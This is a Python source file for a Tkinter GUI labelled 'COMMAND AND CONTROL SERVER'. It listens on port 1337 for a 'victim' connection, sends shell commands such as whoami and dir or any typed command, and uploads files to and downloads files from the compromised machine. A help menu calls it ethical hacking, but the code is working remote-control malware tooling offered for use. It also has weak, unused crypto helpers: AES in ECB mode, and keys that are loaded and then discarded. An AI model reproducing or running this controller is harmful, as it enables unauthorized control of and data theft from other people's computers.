import math
import sys
import tkinter.messagebox
import socket 
import json 
import tqdm
import os 
import rsa
import select
import base64
import hashlib
from Crypto.Cipher import AES
from Crypto import Random
from tkinter import *
import math
import sys
import tkinter.messagebox
def aes_encrypt(key, plaintext):
    # Pad the plaintext to a multiple of 16 bytes
    padded_plaintext = plaintext + (16 - len(plaintext) % 16) * chr(16 - len(plaintext) % 16)
    # Create the AES cipher object
    cipher = AES.new(key.encode(), AES.MODE_ECB)
    # Encrypt the plaintext
    ciphertext = cipher.encrypt(padded_plaintext.encode())
    # Base64-encode the ciphertext for easier transmission
    return base64.b64encode(ciphertext).decode()

def aes_decrypt(key, ciphertext):
    # Decode the ciphertext from base64
    ciphertext = base64.b64decode(ciphertext)
    # Create the AES cipher object
    cipher = AES.new(key.encode(), AES.MODE_ECB)
    # Decrypt the ciphertext
    decrypted_text = cipher.decrypt(ciphertext)
    # Remove the padding from the decrypted text
    unpadded_text = decrypted_text[:-decrypted_text[-1]]
    # Convert the decrypted text to a string
    plaintext = unpadded_text.decode('utf-8')
    return plaintext

def generateKeys():
    global publicKey
    global privateKey
    (publicKey, privateKey) = rsa.newkeys(1024)
    with open('publicKey(server).pem', 'wb') as p:
        p.write(publicKey.save_pkcs1('PEM'))
    with open('privateKey(server).pem', 'wb') as p:
        p.write(privateKey.save_pkcs1('PEM'))
    
    
def loadKeys():
    with open('publicKey(server).pem', 'rb') as p:
        publicKey = rsa.PublicKey.load_pkcs1(p.read())
    with open('privateKey(server).pem', 'rb') as p:
        privateKey = rsa.PrivateKey.load_pkcs1(p.read())
    #return rsa.encrypt(message.encode('ascii'), privateKey)


def content():
    jsondata=json.dumps("dir")#convert a subset of Python objects into a json string
    target.send (jsondata.encode())#sending the encoded data via the socket
    result=receive_response() #receive response from the victim computer
    tkinter.messagebox.showinfo("Command OUTPUT",result)
    print(result)
    
       
def direct():
    jsondata=json.dumps("whoami")#convert a subset of Python objects into a json string
    target.send (jsondata.encode())#sending the encoded data via the socket
    result=receive_response() #receive response from the victim computer
    tkinter.messagebox.showinfo("Command OUTPUT",result)
    print(result)


def helpmenu():
    helpmenu=Tk()
    helpmenu.geometry("1200x1200+500+500")
    helpmenu.title("HELPMENU")
    info=Label(helpmenu, text="""Welcome to the helpmenu!! \n In ethical hacking, command and control (C2) refers to the process of establishing and maintaining communication channels between an attacker and a compromised system or network. \n
    This allows the attacker to remotely control and manipulate the compromised system or network for various purposes, such as data exfiltration, privilege escalation, and launching further attacks.
    \nHowever, in the context of ethical hacking, C2 is used for defensive purposes, rather than offensive ones. 
    \nEthical hackers may use C2 techniques to test the security posture of an organization by simulating a real-world attack scenario. 
    \nThis involves creating a simulated attack environment and using C2 techniques to control and manipulate the target systems or networks.
    \nEthical hackers may also use C2 techniques to detect and respond to real-world attacks. By establishing communication channels with compromised systems or networks, they can monitor the attacker's activities and collect valuable intelligence to identify the attack vector and prevent further damage.
    \nHowever, the use of C2 techniques in ethical hacking requires strict adherence to ethical principles and legal guidelines. Ethical hackers must obtain proper authorization before conducting any C2 activity, ensure that the activity does not cause harm or disruption to the target systems or networks, and maintain strict confidentiality and data privacy. 
    \nThey must also ensure that all C2 activity is conducted in accordance with the organization's policies and standards, as well as applicable laws and regulations.""")

    info.pack()
    helpmenu.mainloop()

def send_command(action):
    jsondata=json.dumps(action)#convert a subset of Python objects into a json string
    target.send (jsondata.encode())#sending the encoded data via the socket

def receive_response():
    data = ''
    while True:
        try: 
            data = data + target.recv(1024).decode().rstrip() #socket receive 1024 bytes function and decoding 
            return json.loads(data)
        except ValueError:
            continue

def upload(filename):
    f=open(filename, 'rb')
    target.send(f.read())


def download_file(option):
    f=open(option, 'wb') #write bytes option for opening the file 
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk=target.recv(1024)
        except socket.timeout as e: #if we reach end of file 
            break
    target.settimeout(None)
    f.close()

def quit():
    #command=name.get()
    send_command("quit")#calling the function for sending the command to the victim
    #if command == "quit": #breaking out of the program option
    gui.destroy()


def target_communication():
    command=name.get()
    while True:
        send_command(command)#calling the function for sending the command to the victim
        if command == "quit": #breaking out of the program option
            gui.destroy()
            break 
        elif command == "clear":
            os.system("clear")
        elif command[:3] =="cd ":
            pass
        elif command [:8] == "download":
            download_file(command[9:])
        elif command[:6] == "upload":
            upload(command[7:])
        else:
            result=receive_response() #receive response from the victim computer
            tkinter.messagebox.showinfo("Command OUTPUT",result)

            print(result)
            break


gui=Tk()
gui.geometry("600x420+200+200")
#Tops=Frame(gui,width=100,height=20,bd=4,relief="raise")
#Tops.grid(row=1, column=2)
gui.title("COMMAND AND CONTROL SERVER")
mlabel=Label(text="COMMAND AND CONTROL",fg="red",bg="white").grid(row=0, column=1)

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM) #IPV4 ADDRESS AND TCP PROTOCOL SPECIIFCATION
sock.bind(("192.168.1.172", 1337)) #specifying the server IP ADDRESS
print("[+] LISTENING FOR INCOMING CONNECTIONS")
sock.listen(5) #up to 5 different connections
#storing the target connection objetcts in variables (socket and ip address)
target, ip = sock.accept()
print("[+] Target connected From: " +str(ip))
x=("[+] Target connected From: " +str(ip))

#target_communication()#calling the communication function
name=StringVar()

label=Label(gui)
label.grid(column=3, row=3)

#LABELS
mlabel1=Label(text="COMMAND TO ATTACK",fg="red",bg="cyan").grid(row=1, column=0)

#ENTRIES
req=Entry(gui,font=("arial", 18,"bold"),textvariable=name, width=21, bd=4, justify="left")
req.grid(row=1, column=1)

#BUTTONS
mbutton0=Button(gui,text="SEND", command=target_communication).grid(row=1, column=3)
mbutton=Button(gui,text="USERNAME", command=direct).grid(row=2, column=0)
mbutton=Button(gui,text="DIRECTORY CONTENTS", command=content).grid(row=2, column=1)
mbutton2=Button(gui,text="QUIT", command=quit).grid(row=4, column=0)
button1=Button(gui, text="HELP MENU", command=helpmenu).grid(row=2, column=3)


tkinter.messagebox.showinfo("CONNECTED",str(x))


gui.mainloop()
